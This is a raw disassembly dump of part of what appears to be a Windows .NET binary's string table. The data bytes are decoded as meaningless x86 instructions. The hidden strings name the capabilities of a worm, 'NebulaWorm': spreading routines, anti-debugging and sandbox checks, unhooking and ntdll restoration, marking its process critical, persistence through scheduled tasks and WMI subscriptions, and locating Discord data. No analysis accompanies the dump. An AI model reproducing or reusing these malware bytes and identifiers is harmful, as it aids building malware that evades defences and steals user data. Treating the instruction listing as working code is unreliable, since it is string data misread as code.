  4080e6:	65 00 50 69          	add    %dl,%gs:0x69(%eax)
  4080ea:	6e                   	outsb  %ds:(%esi),(%dx)
  4080eb:	67 00 53 79          	add    %dl,0x79(%bp,%di)
  4080ef:	73 74                	jae    0x408165
  4080f1:	65 6d                	gs insl (%dx),%es:(%edi)
  4080f3:	2e 54                	cs push %esp
  4080f5:	68 72 65 61 64       	push   $0x64616572
  4080fa:	69 6e 67 00 53 74 6f 	imul   $0x6f745300,0x67(%esi),%ebp
  408101:	70 53                	jo     0x408156
  408103:	70 72                	jo     0x408177
  408105:	65 61                	gs popa
  408107:	64 69 6e 67 00 53 74 	imul   $0x61745300,%fs:0x67(%esi),%ebp
  40810e:	61 
  40810f:	72 74                	jb     0x408185
  408111:	53                   	push   %ebx
  408112:	70 72                	jo     0x408186
  408114:	65 61                	gs popa
  408116:	64 69 6e 67 00 50 65 	imul   $0x6e655000,%fs:0x67(%esi),%ebp
  40811d:	6e 
  40811e:	64 69 6e 67 00 45 6e 	imul   $0x636e4500,%fs:0x67(%esi),%ebp
  408125:	63 
  408126:	6f                   	outsl  %ds:(%esi),(%dx)
  408127:	64 69 6e 67 00 49 73 	imul   $0x4c734900,%fs:0x67(%esi),%ebp
  40812e:	4c 
  40812f:	6f                   	outsl  %ds:(%esi),(%dx)
  408130:	67 67 69 6e 67 00 49 	addr16 imul $0x53734900,0x67(%bp),%ebp
  408137:	73 53 
  408139:	61                   	popa
  40813a:	6e                   	outsb  %ds:(%esi),(%dx)
  40813b:	64 62 6f 78          	bound  %ebp,%fs:0x78(%edi)
  40813f:	53                   	push   %ebx
  408140:	65 72 76             	gs jb  0x4081b9
  408143:	69 63 65 52 75 6e 6e 	imul   $0x6e6e7552,0x65(%ebx),%esp
  40814a:	69 6e 67 00 69 73 52 	imul   $0x52736900,0x67(%esi),%ebp
  408151:	75 6e                	jne    0x4081c1
  408153:	6e                   	outsb  %ds:(%esi),(%dx)
  408154:	69 6e 67 00 49 73 44 	imul   $0x44734900,0x67(%esi),%ebp
  40815b:	65 62 75 67          	bound  %esi,%gs:0x67(%ebp)
  40815f:	67 65 72 50          	addr16 gs jb 0x4081b3
  408163:	72 6f                	jb     0x4081d4
  408165:	63 65 73             	arpl   %esp,0x73(%ebp)
  408168:	73 52                	jae    0x4081bc
  40816a:	75 6e                	jne    0x4081da
  40816c:	6e                   	outsb  %ds:(%esi),(%dx)
  40816d:	69 6e 67 00 72 75 6e 	imul   $0x6e757200,0x67(%esi),%ebp
  408174:	6e                   	outsb  %ds:(%esi),(%dx)
  408175:	69 6e 67 00 53 79 73 	imul   $0x73795300,0x67(%esi),%ebp
  40817c:	74 65                	je     0x4081e3
  40817e:	6d                   	insl   (%dx),%es:(%edi)
  40817f:	2e 52                	cs push %edx
  408181:	75 6e                	jne    0x4081f1
  408183:	74 69                	je     0x4081ee
  408185:	6d                   	insl   (%dx),%es:(%edi)
  408186:	65 2e 56             	gs cs push %esi
  408189:	65 72 73             	gs jb  0x4081ff
  40818c:	69 6f 6e 69 6e 67 00 	imul   $0x676e69,0x6e(%edi),%ebp
  408193:	54                   	push   %esp
  408194:	6f                   	outsl  %ds:(%esi),(%dx)
  408195:	53                   	push   %ebx
  408196:	74 72                	je     0x40820a
  408198:	69 6e 67 00 67 65 74 	imul   $0x74656700,0x67(%esi),%ebp
  40819f:	5f                   	pop    %edi
  4081a0:	51                   	push   %ecx
  4081a1:	75 65                	jne    0x408208
  4081a3:	72 79                	jb     0x40821e
  4081a5:	53                   	push   %ebx
  4081a6:	74 72                	je     0x40821a
  4081a8:	69 6e 67 00 53 75 62 	imul   $0x62755300,0x67(%esi),%ebp
  4081af:	73 74                	jae    0x408225
  4081b1:	72 69                	jb     0x40821c
  4081b3:	6e                   	outsb  %ds:(%esi),(%dx)
  4081b4:	67 00 41 6e          	add    %al,0x6e(%bx,%di)
  4081b8:	74 69                	je     0x408223
  4081ba:	44                   	inc    %esp
  4081bb:	65 62 75 67          	bound  %esi,%gs:0x67(%ebp)
  4081bf:	00 53 74             	add    %dl,0x74(%ebx)
  4081c2:	6f                   	outsl  %ds:(%esi),(%dx)
  4081c3:	70 77                	jo     0x40823c
  4081c5:	61                   	popa
  4081c6:	74 63                	je     0x40822b
  4081c8:	68 00 73 65 74       	push   $0x74657300
  4081cd:	5f                   	pop    %edi
  4081ce:	41                   	inc    %ecx
  4081cf:	75 74                	jne    0x408245
  4081d1:	6f                   	outsl  %ds:(%esi),(%dx)
  4081d2:	46                   	inc    %esi
  4081d3:	6c                   	insb   (%dx),%es:(%edi)
  4081d4:	75 73                	jne    0x408249
  4081d6:	68 00 67 65 74       	push   $0x74656700
  4081db:	5f                   	pop    %edi
  4081dc:	50                   	push   %eax
  4081dd:	61                   	popa
  4081de:	74 68                	je     0x408248
  4081e0:	00 47 65             	add    %al,0x65(%edi)
  4081e3:	74 44                	je     0x408229
  4081e5:	69 73 63 6f 72 64 4c 	imul   $0x4c64726f,0x63(%ebx),%esi
  4081ec:	6f                   	outsl  %ds:(%esi),(%dx)
  4081ed:	63 61 6c             	arpl   %esp,0x6c(%ecx)
  4081f0:	41                   	inc    %ecx
  4081f1:	70 70                	jo     0x408263
  4081f3:	44                   	inc    %esp
  4081f4:	61                   	popa
  4081f5:	74 61                	je     0x408258
  4081f7:	50                   	push   %eax
  4081f8:	61                   	popa
  4081f9:	74 68                	je     0x408263
  4081fb:	00 73 6f             	add    %dh,0x6f(%ebx)
  4081fe:	75 72                	jne    0x408272
  408200:	63 65 50             	arpl   %esp,0x50(%ebp)
  408203:	61                   	popa
  408204:	74 68                	je     0x40826e
  408206:	00 72 65             	add    %dh,0x65(%edx)
  408209:	6d                   	insl   (%dx),%es:(%edi)
  40820a:	6f                   	outsl  %ds:(%esi),(%dx)
  40820b:	74 65                	je     0x408272
  40820d:	46                   	inc    %esi
  40820e:	69 6c 65 50 61 74 68 	imul   $0x687461,0x50(%ebp,%eiz,2),%ebp
  408215:	00 
  408216:	67 65 74 5f          	addr16 gs je 0x408279
  40821a:	52                   	push   %edx
  40821b:	65 6c                	gs insb (%dx),%es:(%edi)
  40821d:	61                   	popa
  40821e:	74 69                	je     0x408289
  408220:	76 65                	jbe    0x408287
  408222:	50                   	push   %eax
  408223:	61                   	popa
  408224:	74 68                	je     0x40828e
  408226:	00 65 78             	add    %ah,0x78(%ebp)
  408229:	65 50                	gs push %eax
  40822b:	61                   	popa
  40822c:	74 68                	je     0x408296
  40822e:	00 6c 6e 6b          	add    %ch,0x6b(%esi,%ebp,2)
  408232:	50                   	push   %eax
  408233:	61                   	popa
  408234:	74 68                	je     0x40829e
  408236:	00 47 65             	add    %al,0x65(%edi)
  408239:	74 46                	je     0x408281
  40823b:	75 6c                	jne    0x4082a9
  40823d:	6c                   	insb   (%dx),%es:(%edi)
  40823e:	50                   	push   %eax
  40823f:	61                   	popa
  408240:	74 68                	je     0x4082aa
  408242:	00 47 65             	add    %al,0x65(%edi)
  408245:	74 54                	je     0x40829b
  408247:	65 6d                	gs insl (%dx),%es:(%edi)
  408249:	70 50                	jo     0x40829b
  40824b:	61                   	popa
  40824c:	74 68                	je     0x4082b6
  40824e:	00 47 65             	add    %al,0x65(%edi)
  408251:	74 46                	je     0x408299
  408253:	6f                   	outsl  %ds:(%esi),(%dx)
  408254:	6c                   	insb   (%dx),%es:(%edi)
  408255:	64 65 72 50          	fs gs jb 0x4082a9
  408259:	61                   	popa
  40825a:	74 68                	je     0x4082c4
  40825c:	00 66 6f             	add    %ah,0x6f(%esi)
  40825f:	6c                   	insb   (%dx),%es:(%edi)
  408260:	64 65 72 50          	fs gs jb 0x4082b4
  408264:	61                   	popa
  408265:	74 68                	je     0x4082cf
  408267:	00 74 61 72          	add    %dh,0x72(%ecx,%eiz,2)
  40826b:	67 65 74 50          	addr16 gs je 0x4082bf
  40826f:	61                   	popa
  408270:	74 68                	je     0x4082da
  408272:	00 4d 61             	add    %cl,0x61(%ebp)
  408275:	6e                   	outsb  %ds:(%esi),(%dx)
  408276:	61                   	popa
  408277:	67 65 6d             	gs insl (%dx),%es:(%di)
  40827a:	65 6e                	outsb  %gs:(%esi),(%dx)
  40827c:	74 50                	je     0x4082ce
  40827e:	61                   	popa
  40827f:	74 68                	je     0x4082e9
  408281:	00 63 75             	add    %ah,0x75(%ebx)
  408284:	72 72                	jb     0x4082f8
  408286:	65 6e                	outsb  %gs:(%esi),(%dx)
  408288:	74 50                	je     0x4082da
  40828a:	61                   	popa
  40828b:	74 68                	je     0x4082f5
  40828d:	00 70 61             	add    %dh,0x61(%eax)
  408290:	74 68                	je     0x4082fa
  408292:	00 67 65             	add    %ah,0x65(%edi)
  408295:	74 5f                	je     0x4082f6
  408297:	4c                   	dec    %esp
  408298:	65 6e                	outsb  %gs:(%esi),(%dx)
  40829a:	67 74 68             	addr16 je 0x408305
  40829d:	00 6c 65 6e          	add    %ch,0x6e(%ebp,%eiz,2)
  4082a1:	67 74 68             	addr16 je 0x40830c
  4082a4:	00 53 74             	add    %dl,0x74(%ebx)
  4082a7:	61                   	popa
  4082a8:	72 74                	jb     0x40831e
  4082aa:	73 57                	jae    0x408303
  4082ac:	69 74 68 00 53 6c 6f 	imul   $0x776f6c53,0x0(%eax,%ebp,2),%esi
  4082b3:	77 
  4082b4:	57                   	push   %edi
  4082b5:	69 00 55 6e 68 6f    	imul   $0x6f686e55,(%eax),%eax
  4082bb:	6f                   	outsl  %ds:(%esi),(%dx)
  4082bc:	6b 00 67             	imul   $0x67,(%eax),%eax
  4082bf:	65 74 5f             	gs je  0x408321
  4082c2:	54                   	push   %esp
  4082c3:	61                   	popa
  4082c4:	73 6b                	jae    0x408331
  4082c6:	00 43 72             	add    %al,0x72(%ebx)
  4082c9:	65 61                	gs popa
  4082cb:	74 65                	je     0x408332
  4082cd:	4f                   	dec    %edi
  4082ce:	72 55                	jb     0x408325
  4082d0:	70 64                	jo     0x408336
  4082d2:	61                   	popa
  4082d3:	74 65                	je     0x40833a
  4082d5:	53                   	push   %ebx
  4082d6:	63 68 65             	arpl   %ebp,0x65(%eax)
  4082d9:	64 75 6c             	fs jne 0x408348
  4082dc:	65 64 54             	gs fs push %esp
  4082df:	61                   	popa
  4082e0:	73 6b                	jae    0x40834d
  4082e2:	00 4d 61             	add    %cl,0x61(%ebp)
  4082e5:	6b 65 43 72          	imul   $0x72,0x43(%ebp),%esp
  4082e9:	69 74 69 63 61 6c 00 	imul   $0x52006c61,0x63(%ecx,%ebp,2),%esi
  4082f0:	52 
  4082f1:	65 6d                	gs insl (%dx),%es:(%edi)
  4082f3:	6f                   	outsl  %ds:(%esi),(%dx)
  4082f4:	76 65                	jbe    0x40835b
  4082f6:	43                   	inc    %ebx
  4082f7:	72 69                	jb     0x408362
  4082f9:	74 69                	je     0x408364
  4082fb:	63 61 6c             	arpl   %esp,0x6c(%ecx)
  4082fe:	00 62 49             	add    %ah,0x49(%edx)
  408301:	73 43                	jae    0x408346
  408303:	72 69                	jb     0x40836e
  408305:	74 69                	je     0x408370
  408307:	63 61 6c             	arpl   %esp,0x6c(%ecx)
  40830a:	00 52 74             	add    %dl,0x74(%edx)
  40830d:	6c                   	insb   (%dx),%es:(%edi)
  40830e:	53                   	push   %ebx
  40830f:	65 74 50             	gs je  0x408362
  408312:	72 6f                	jb     0x408383
  408314:	63 65 73             	arpl   %esp,0x73(%ebp)
  408317:	73 49                	jae    0x408362
  408319:	73 43                	jae    0x40835e
  40831b:	72 69                	jb     0x408386
  40831d:	74 69                	je     0x408388
  40831f:	63 61 6c             	arpl   %esp,0x6c(%ecx)
  408322:	00 4d 61             	add    %cl,0x61(%ebp)
  408325:	72 73                	jb     0x40839a
  408327:	68 61 6c 00 53       	push   $0x53006c61
  40832c:	79 73                	jns    0x4083a1
  40832e:	74 65                	je     0x408395
  408330:	6d                   	insl   (%dx),%es:(%edi)
  408331:	2e 53                	cs push %ebx
  408333:	65 63 75 72          	arpl   %esi,%gs:0x72(%ebp)
  408337:	69 74 79 2e 50 72 69 	imul   $0x6e697250,0x2e(%ecx,%edi,2),%esi
  40833e:	6e 
  40833f:	63 69 70             	arpl   %ebp,0x70(%ecx)
  408342:	61                   	popa
  408343:	6c                   	insb   (%dx),%es:(%edi)
  408344:	00 57 69             	add    %dl,0x69(%edi)
  408347:	6e                   	outsb  %ds:(%esi),(%dx)
  408348:	64 6f                	outsl  %fs:(%esi),(%dx)
  40834a:	77 73                	ja     0x4083bf
  40834c:	50                   	push   %eax
  40834d:	72 69                	jb     0x4083b8
  40834f:	6e                   	outsb  %ds:(%esi),(%dx)
  408350:	63 69 70             	arpl   %ebp,0x70(%ecx)
  408353:	61                   	popa
  408354:	6c                   	insb   (%dx),%es:(%edi)
  408355:	00 50 61             	add    %dl,0x61(%eax)
  408358:	74 68                	je     0x4083c2
  40835a:	73 45                	jae    0x4083a1
  40835c:	71 75                	jno    0x4083d3
  40835e:	61                   	popa
  40835f:	6c                   	insb   (%dx),%es:(%edi)
  408360:	00 43 61             	add    %al,0x61(%ebx)
  408363:	6e                   	outsb  %ds:(%esi),(%dx)
  408364:	63 65 6c             	arpl   %esp,0x6c(%ebp)
  408367:	00 6d 6f             	add    %ch,0x6f(%ebp)
  40836a:	64 65 6c             	fs gs insb (%dx),%es:(%edi)
  40836d:	00 41 75             	add    %al,0x75(%ecx)
  408370:	74 68                	je     0x4083da
  408372:	65 6e                	outsb  %gs:(%esi),(%dx)
  408374:	74 69                	je     0x4083df
  408376:	63 61 74             	arpl   %esp,0x74(%ecx)
  408379:	69 6f 6e 4c 65 76 65 	imul   $0x6576654c,0x6e(%edi),%ebp
  408380:	6c                   	insb   (%dx),%es:(%edi)
  408381:	00 49 6d             	add    %cl,0x6d(%ecx)
  408384:	70 65                	jo     0x4083eb
  408386:	72 73                	jb     0x4083fb
  408388:	6f                   	outsl  %ds:(%esi),(%dx)
  408389:	6e                   	outsb  %ds:(%esi),(%dx)
  40838a:	61                   	popa
  40838b:	74 69                	je     0x4083f6
  40838d:	6f                   	outsl  %ds:(%esi),(%dx)
  40838e:	6e                   	outsb  %ds:(%esi),(%dx)
  40838f:	4c                   	dec    %esp
  408390:	65 76 65             	gs jbe 0x4083f8
  408393:	6c                   	insb   (%dx),%es:(%edi)
  408394:	00 57 68             	add    %dl,0x68(%edi)
  408397:	65 6e                	outsb  %gs:(%esi),(%dx)
  408399:	41                   	inc    %ecx
  40839a:	6c                   	insb   (%dx),%es:(%edi)
  40839b:	6c                   	insb   (%dx),%es:(%edi)
  40839c:	00 6b 65             	add    %ch,0x65(%ebx)
  40839f:	72 6e                	jb     0x40840f
  4083a1:	65 6c                	gs insb (%dx),%es:(%edi)
  4083a3:	33 32                	xor    (%edx),%esi
  4083a5:	2e 64 6c             	cs fs insb (%dx),%es:(%edi)
  4083a8:	6c                   	insb   (%dx),%es:(%edi)
  4083a9:	00 75 73             	add    %dh,0x73(%ebp)
  4083ac:	65 72 33             	gs jb  0x4083e2
  4083af:	32 2e                	xor    (%esi),%ch
  4083b1:	64 6c                	fs insb (%dx),%es:(%edi)
  4083b3:	6c                   	insb   (%dx),%es:(%edi)
  4083b4:	00 6e 74             	add    %ch,0x74(%esi)
  4083b7:	64 6c                	fs insb (%dx),%es:(%edi)
  4083b9:	6c                   	insb   (%dx),%es:(%edi)
  4083ba:	2e 64 6c             	cs fs insb (%dx),%es:(%edi)
  4083bd:	6c                   	insb   (%dx),%es:(%edi)
  4083be:	00 52 65             	add    %dl,0x65(%edx)
  4083c1:	73 74                	jae    0x408437
  4083c3:	6f                   	outsl  %ds:(%esi),(%dx)
  4083c4:	72 65                	jb     0x40842b
  4083c6:	4e                   	dec    %esi
  4083c7:	74 64                	je     0x40842d
  4083c9:	6c                   	insb   (%dx),%es:(%edi)
  4083ca:	6c                   	insb   (%dx),%es:(%edi)
  4083cb:	00 4b 69             	add    %cl,0x69(%ebx)
  4083ce:	6c                   	insb   (%dx),%es:(%edi)
  4083cf:	6c                   	insb   (%dx),%es:(%edi)
  4083d0:	00 4e 65             	add    %cl,0x65(%esi)
  4083d3:	74 77                	je     0x40844c
  4083d5:	6f                   	outsl  %ds:(%esi),(%dx)
  4083d6:	72 6b                	jb     0x408443
  4083d8:	53                   	push   %ebx
  4083d9:	74 72                	je     0x40844d
  4083db:	65 61                	gs popa
  4083dd:	6d                   	insl   (%dx),%es:(%edi)
  4083de:	00 47 65             	add    %al,0x65(%edi)
  4083e1:	74 53                	je     0x408436
  4083e3:	74 72                	je     0x408457
  4083e5:	65 61                	gs popa
  4083e7:	6d                   	insl   (%dx),%es:(%edi)
  4083e8:	00 67 65             	add    %ah,0x65(%edi)
  4083eb:	74 5f                	je     0x40844c
  4083ed:	4f                   	dec    %edi
  4083ee:	75 74                	jne    0x408464
  4083f0:	70 75                	jo     0x408467
  4083f2:	74 53                	je     0x408447
  4083f4:	74 72                	je     0x408468
  4083f6:	65 61                	gs popa
  4083f8:	6d                   	insl   (%dx),%es:(%edi)
  4083f9:	00 50 72             	add    %dl,0x72(%eax)
  4083fc:	6f                   	outsl  %ds:(%esi),(%dx)
  4083fd:	67 72 61             	addr16 jb 0x408461
  408400:	6d                   	insl   (%dx),%es:(%edi)
  408401:	00 67 65             	add    %ah,0x65(%edi)
  408404:	74 5f                	je     0x408465
  408406:	49                   	dec    %ecx
  408407:	74 65                	je     0x40846e
  408409:	6d                   	insl   (%dx),%es:(%edi)
  40840a:	00 73 65             	add    %dh,0x65(%ebx)
  40840d:	74 5f                	je     0x40846e
  40840f:	49                   	dec    %ecx
  408410:	74 65                	je     0x408477
  408412:	6d                   	insl   (%dx),%es:(%edi)
  408413:	00 53 79             	add    %dl,0x79(%ebx)
  408416:	73 74                	jae    0x40848c
  408418:	65 6d                	gs insl (%dx),%es:(%edi)
  40841a:	00 53 65             	add    %dl,0x65(%ebx)
  40841d:	6d                   	insl   (%dx),%es:(%edi)
  40841e:	61                   	popa
  40841f:	70 68                	jo     0x408489
  408421:	6f                   	outsl  %ds:(%esi),(%dx)
  408422:	72 65                	jb     0x408489
  408424:	53                   	push   %ebx
  408425:	6c                   	insb   (%dx),%es:(%edi)
  408426:	69 6d 00 52 61 6e 64 	imul   $0x646e6152,0x0(%ebp),%ebp
  40842d:	6f                   	outsl  %ds:(%esi),(%dx)
  40842e:	6d                   	insl   (%dx),%es:(%edi)
  40842f:	00 4e 65             	add    %cl,0x65(%esi)
  408432:	62 75 6c             	bound  %esi,0x6c(%ebp)
  408435:	61                   	popa
  408436:	57                   	push   %edi
  408437:	6f                   	outsl  %ds:(%esi),(%dx)
  408438:	72 6d                	jb     0x4084a7
  40843a:	00 76 6d             	add    %dh,0x6d(%esi)
  40843d:	00 6f 70             	add    %ch,0x70(%edi)
  408440:	5f                   	pop    %edi
  408441:	4c                   	dec    %esp
  408442:	65 73 73             	gs jae 0x4084b8
  408445:	54                   	push   %esp
  408446:	68 61 6e 00 54       	push   $0x54006e61
  40844b:	69 6d 65 53 70 61 6e 	imul   $0x6e617053,0x65(%ebp),%ebp
  408452:	00 67 65             	add    %ah,0x65(%edi)
  408455:	74 5f                	je     0x4084b6
  408457:	54                   	push   %esp
  408458:	6f                   	outsl  %ds:(%esi),(%dx)
  408459:	6b 65 6e 00          	imul   $0x0,0x6e(%ebp),%esp
  40845d:	43                   	inc    %ebx
  40845e:	61                   	popa
  40845f:	6e                   	outsb  %ds:(%esi),(%dx)
  408460:	63 65 6c             	arpl   %esp,0x6c(%ebp)
  408463:	6c                   	insb   (%dx),%es:(%edi)
  408464:	61                   	popa
  408465:	74 69                	je     0x4084d0
  408467:	6f                   	outsl  %ds:(%esi),(%dx)
  408468:	6e                   	outsb  %ds:(%esi),(%dx)
  408469:	54                   	push   %esp
  40846a:	6f                   	outsl  %ds:(%esi),(%dx)
  40846b:	6b 65 6e 00          	imul   $0x0,0x6e(%ebp),%esp
  40846f:	74 6f                	je     0x4084e0
  408471:	6b 65 6e 00          	imul   $0x0,0x6e(%ebp),%esp
  408475:	49                   	dec    %ecx
  408476:	73 50                	jae    0x4084c8
  408478:	6f                   	outsl  %ds:(%esi),(%dx)
  408479:	72 74                	jb     0x4084ef
  40847b:	4f                   	dec    %edi
  40847c:	70 65                	jo     0x4084e3
  40847e:	6e                   	outsb  %ds:(%esi),(%dx)
  40847f:	00 4c 69 73          	add    %cl,0x73(%ecx,%ebp,2)
  408483:	74 65                	je     0x4084ea
  408485:	6e                   	outsb  %ds:(%esi),(%dx)
  408486:	00 6c 70 4e          	add    %ch,0x4e(%eax,%esi,2)
  40848a:	75 6d                	jne    0x4084f9
  40848c:	62 65 72             	bound  %esp,0x72(%ebp)
  40848f:	4f                   	dec    %edi
  408490:	66 42                	inc    %dx
  408492:	79 74                	jns    0x408508
  408494:	65 73 57             	gs jae 0x4084ee
  408497:	72 69                	jb     0x408502
  408499:	74 74                	je     0x40850f
  40849b:	65 6e                	outsb  %gs:(%esi),(%dx)
  40849d:	00 42 79             	add    %al,0x79(%edx)
  4084a0:	70 61                	jo     0x408503
  4084a2:	73 73                	jae    0x408517
  4084a4:	57                   	push   %edi
  4084a5:	69 6e 00 4d 61 69 6e 	imul   $0x6e69614d,0x0(%esi),%ebp
  4084ac:	00 4a 6f             	add    %cl,0x6f(%edx)
  4084af:	69 6e 00 73 65 74 5f 	imul   $0x5f746573,0x0(%esi),%ebp
  4084b6:	41                   	inc    %ecx
  4084b7:	75 74                	jne    0x40852d
  4084b9:	68 65 6e 74 69       	push   $0x69746e65
  4084be:	63 61 74             	arpl   %esp,0x74(%ecx)
  4084c1:	69 6f 6e 00 53 79 73 	imul   $0x73795300,0x6e(%edi),%ebp
  4084c8:	74 65                	je     0x40852f
  4084ca:	6d                   	insl   (%dx),%es:(%edi)
  4084cb:	2e 4e                	cs dec %esi
  4084cd:	65 74 2e             	gs je  0x4084fe
  4084d0:	4e                   	dec    %esi
  4084d1:	65 74 77             	gs je  0x40854b
  4084d4:	6f                   	outsl  %ds:(%esi),(%dx)
  4084d5:	72 6b                	jb     0x408542
  4084d7:	49                   	dec    %ecx
  4084d8:	6e                   	outsb  %ds:(%esi),(%dx)
  4084d9:	66 6f                	outsw  %ds:(%esi),(%dx)
  4084db:	72 6d                	jb     0x40854a
  4084dd:	61                   	popa
  4084de:	74 69                	je     0x408549
  4084e0:	6f                   	outsl  %ds:(%esi),(%dx)
  4084e1:	6e                   	outsb  %ds:(%esi),(%dx)
  4084e2:	00 73 65             	add    %dh,0x65(%ebx)
  4084e5:	74 5f                	je     0x408546
  4084e7:	49                   	dec    %ecx
  4084e8:	6d                   	insl   (%dx),%es:(%edi)
  4084e9:	70 65                	jo     0x408550
  4084eb:	72 73                	jb     0x408560
  4084ed:	6f                   	outsl  %ds:(%esi),(%dx)
  4084ee:	6e                   	outsb  %ds:(%esi),(%dx)
  4084ef:	61                   	popa
  4084f0:	74 69                	je     0x40855b
  4084f2:	6f                   	outsl  %ds:(%esi),(%dx)
  4084f3:	6e                   	outsb  %ds:(%esi),(%dx)
  4084f4:	00 53 65             	add    %dl,0x65(%ebx)
  4084f7:	63 75 72             	arpl   %esi,0x72(%ebp)
  4084fa:	69 74 79 41 63 74 69 	imul   $0x6f697463,0x41(%ecx,%edi,2),%esi
  408501:	6f 
  408502:	6e                   	outsb  %ds:(%esi),(%dx)
  408503:	00 6f 70             	add    %ch,0x70(%edi)
  408506:	5f                   	pop    %edi
  408507:	53                   	push   %ebx
  408508:	75 62                	jne    0x40856c
  40850a:	74 72                	je     0x40857e
  40850c:	61                   	popa
  40850d:	63 74 69 6f          	arpl   %esi,0x6f(%ecx,%ebp,2)
  408511:	6e                   	outsb  %ds:(%esi),(%dx)
  408512:	00 53 79             	add    %dl,0x79(%ebx)
  408515:	73 74                	jae    0x40858b
  408517:	65 6d                	gs insl (%dx),%es:(%edi)
  408519:	2e 52                	cs push %edx
  40851b:	65 66 6c             	gs data16 insb (%dx),%es:(%edi)
  40851e:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  408523:	6e                   	outsb  %ds:(%esi),(%dx)
  408524:	00 4e 61             	add    %cl,0x61(%esi)
  408527:	6d                   	insl   (%dx),%es:(%edi)
  408528:	65 56                	gs push %esi
  40852a:	61                   	popa
  40852b:	6c                   	insb   (%dx),%es:(%edi)
  40852c:	75 65                	jne    0x408593
  40852e:	43                   	inc    %ebx
  40852f:	6f                   	outsl  %ds:(%esi),(%dx)
  408530:	6c                   	insb   (%dx),%es:(%edi)
  408531:	6c                   	insb   (%dx),%es:(%edi)
  408532:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  408537:	6e                   	outsb  %ds:(%esi),(%dx)
  408538:	00 4d 61             	add    %cl,0x61(%ebp)
  40853b:	6e                   	outsb  %ds:(%esi),(%dx)
  40853c:	61                   	popa
  40853d:	67 65 6d             	gs insl (%dx),%es:(%di)
  408540:	65 6e                	outsb  %gs:(%esi),(%dx)
  408542:	74 4f                	je     0x408593
  408544:	62 6a 65             	bound  %ebp,0x65(%edx)
  408547:	63 74 43 6f          	arpl   %esi,0x6f(%ebx,%eax,2)
  40854b:	6c                   	insb   (%dx),%es:(%edi)
  40854c:	6c                   	insb   (%dx),%es:(%edi)
  40854d:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  408552:	6e                   	outsb  %ds:(%esi),(%dx)
  408553:	00 48 74             	add    %cl,0x74(%eax)
  408556:	74 70                	je     0x4085c8
  408558:	4c                   	dec    %esp
  408559:	69 73 74 65 6e 65 72 	imul   $0x72656e65,0x74(%ebx),%esi
  408560:	50                   	push   %eax
  408561:	72 65                	jb     0x4085c8
  408563:	66 69 78 43 6f 6c    	imul   $0x6c6f,0x43(%eax),%di
  408569:	6c                   	insb   (%dx),%es:(%edi)
  40856a:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  40856f:	6e                   	outsb  %ds:(%esi),(%dx)
  408570:	00 53 65             	add    %dl,0x65(%ebx)
  408573:	61                   	popa
  408574:	72 63                	jb     0x4085d9
  408576:	68 4f 70 74 69       	push   $0x6974704f
  40857b:	6f                   	outsl  %ds:(%esi),(%dx)
  40857c:	6e                   	outsb  %ds:(%esi),(%dx)
  40857d:	00 49 4f             	add    %cl,0x4f(%ecx)
  408580:	45                   	inc    %ebp
  408581:	78 63                	js     0x4085e6
  408583:	65 70 74             	gs jo  0x4085fa
  408586:	69 6f 6e 00 54 61 73 	imul   $0x73615400,0x6e(%edi),%ebp
  40858d:	6b 43 61 6e          	imul   $0x6e,0x61(%ebx),%eax
  408591:	63 65 6c             	arpl   %esp,0x6c(%ebp)
  408594:	65 64 45             	gs fs inc %ebp
  408597:	78 63                	js     0x4085fc
  408599:	65 70 74             	gs jo  0x408610
  40859c:	69 6f 6e 00 55 6e 61 	imul   $0x616e5500,0x6e(%edi),%ebp
  4085a3:	75 74                	jne    0x408619
  4085a5:	68 6f 72 69 7a       	push   $0x7a69726f
  4085aa:	65 64 41             	gs fs inc %ecx
  4085ad:	63 63 65             	arpl   %esp,0x65(%ebx)
  4085b0:	73 73                	jae    0x408625
  4085b2:	45                   	inc    %ebp
  4085b3:	78 63                	js     0x408618
  4085b5:	65 70 74             	gs jo  0x40862c
  4085b8:	69 6f 6e 00 53 65 74 	imul   $0x74655300,0x6e(%edi),%ebp
  4085bf:	45                   	inc    %ebp
  4085c0:	78 63                	js     0x408625
  4085c2:	65 70 74             	gs jo  0x408639
  4085c5:	69 6f 6e 00 43 72 65 	imul   $0x65724300,0x6e(%edi),%ebp
  4085cc:	61                   	popa
  4085cd:	74 65                	je     0x408634
  4085cf:	57                   	push   %edi
  4085d0:	4d                   	dec    %ebp
  4085d1:	49                   	dec    %ecx
  4085d2:	45                   	inc    %ebp
  4085d3:	76 65                	jbe    0x40863a
  4085d5:	6e                   	outsb  %ds:(%esi),(%dx)
  4085d6:	74 53                	je     0x40862b
  4085d8:	75 62                	jne    0x40863c
  4085da:	73 63                	jae    0x40863f
  4085dc:	72 69                	jb     0x408647
  4085de:	70 74                	jo     0x408654
  4085e0:	69 6f 6e 00 53 74 72 	imul   $0x72745300,0x6e(%edi),%ebp
  4085e7:	69 6e 67 43 6f 6d 70 	imul   $0x706d6f43,0x67(%esi),%ebp
  4085ee:	61                   	popa
  4085ef:	72 69                	jb     0x40865a
  4085f1:	73 6f                	jae    0x408662
  4085f3:	6e                   	outsb  %ds:(%esi),(%dx)
  4085f4:	00 52 61             	add    %dl,0x61(%edx)
  4085f7:	6d                   	insl   (%dx),%es:(%edi)
  4085f8:	52                   	push   %edx
  4085f9:	75 6e                	jne    0x408669
  4085fb:	00 46 69             	add    %al,0x69(%esi)
  4085fe:	6c                   	insb   (%dx),%es:(%edi)
  4085ff:	65 49                	gs dec %ecx
  408601:	6e                   	outsb  %ds:(%esi),(%dx)
  408602:	66 6f                	outsw  %ds:(%esi),(%dx)
  408604:	00 44 72 69          	add    %al,0x69(%edx,%esi,2)
  408608:	76 65                	jbe    0x40866f
  40860a:	49                   	dec    %ecx
  40860b:	6e                   	outsb  %ds:(%esi),(%dx)
  40860c:	66 6f                	outsw  %ds:(%esi),(%dx)
  40860e:	00 45 78             	add    %al,0x78(%ebp)
  408611:	63 65 70             	arpl   %esp,0x70(%ebp)
  408614:	74 69                	je     0x40867f
  408616:	6f                   	outsl  %ds:(%esi),(%dx)
  408617:	6e                   	outsb  %ds:(%esi),(%dx)
  408618:	44                   	inc    %esp
  408619:	69 73 70 61 74 63 68 	imul   $0x68637461,0x70(%ebx),%esi
  408620:	49                   	dec    %ecx
  408621:	6e                   	outsb  %ds:(%esi),(%dx)
  408622:	66 6f                	outsw  %ds:(%esi),(%dx)
